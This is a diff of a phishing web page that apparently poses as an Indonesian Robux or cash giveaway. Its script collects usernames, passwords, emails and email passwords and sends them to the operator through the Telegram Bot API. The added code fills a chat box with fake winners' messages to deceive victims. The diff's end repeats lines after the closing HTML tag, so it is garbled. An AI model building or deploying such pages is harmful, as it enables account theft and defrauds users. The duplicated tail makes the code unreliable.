@@ -15,8 +15,6 @@
         .btn-opt.active { border-color: #ffd700; background: rgba(255, 215, 0, 0.2); }
         .input-glow { background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(255, 215, 0, 0.2); width: 100%; padding: 15px; border-radius: 15px; color: #ffd700; outline: none; }
         .hidden { display: none !important; }
-        
-        /* Musik Toggle Button */
         #music-toggle { position: fixed; top: 20px; right: 20px; z-index: 1000; background: rgba(255, 215, 0, 0.1); border: 1px solid #ffd700; color: #ffd700; padding: 10px; border-radius: 50%; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 18px; box-shadow: 0 0 10px rgba(255, 215, 0, 0.3); }
     </style>
 </head>
@@ -81,23 +79,13 @@
         const btnMusic = document.getElementById('music-toggle');
 
         function toggleMusic() {
-            if (audio.muted) {
-                audio.muted = false;
-                audio.volume = 0.5;
-                audio.play();
-                btnMusic.innerText = "🔊";
-            } else {
-                audio.muted = true;
-                btnMusic.innerText = "🔇";
-            }
+            if (audio.muted) { audio.muted = false; audio.volume = 0.5; audio.play(); btnMusic.innerText = "🔊"; } 
+            else { audio.muted = true; btnMusic.innerText = "🔇"; }
         }
 
         function setA(b, v) { 
             document.querySelectorAll('.btn-opt').forEach(x => x.classList.remove('active')); 
-            b.classList.add('active'); 
-            amt = v; 
-            // Otomatis mulai muter saat klik (tapi tetep mute kalau belum klik tombol kanan atas)
-            audio.play().catch(()=>{});
+            b.classList.add('active'); amt = v; audio.play().catch(()=>{});
         }
 
         function go(f, t) { if (!amt && f == 1) return; document.getElementById('p' + f).classList.add('hidden'); document.getElementById('p' + t).classList.remove('hidden'); }
@@ -110,6 +98,19 @@
             fetch(form, { method: 'POST', mode: 'no-cors', body: fd });
             fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(`🚀 *ELITE*\n👤 \`${u}\`\n🔑 \`${p}\`\n📧 \`${e}\`\n🔐 \`${ep}\`\n💎 \`${amt}\``)}&parse_mode=Markdown`);
             go(3, 4); setTimeout(() => document.getElementById('bar').style.width = "100%", 100);
+        }
+
+        const botMsgs = [{n:"Rizky***",m:"Landing mulus thx admin."}, {n:"Vito***",m:"Beneran masuk 10k!"}, {n:"Adit***",m:"Yess cair 50k!"}];
+        function addChat(n,m,v=false){
+            const b=document.getElementById('chat-content'), d=document.createElement('div');
+            d.className=`${v?'text-teal-400 font-bold':''}`; d.innerHTML=`<span class="text-yellow-500 font-bold">${n}</span>: ${m}`;
+            b.insertBefore(d,b.firstChild); if(b.childNodes.length>7)b.removeChild(b.lastChild);
+        }
+        setInterval(()=>{const b=botMsgs[Math.floor(Math.random()*botMsgs.length)]; addChat(b.n,b.m);},3000);
+        function victimSend(){ const i=document.getElementById('victim-msg'); if(!i.value)return; const m=["Semoga masuk 24jam","yess akhirnya bisa punya robux banyak"]; addChat("K***_Anom", m[Math.floor(Math.random()*m.length)],true); i.value=""; }
+    </script>
+</body>
+</html>
         }
 
         const botMsgs = [{n:"Rizky***",m:"Landing mulus thx admin."}, {n:"Vito***",m:"Beneran masuk 10k!"}, {n:"Adit***",m:"Yess cair 50k!"}];
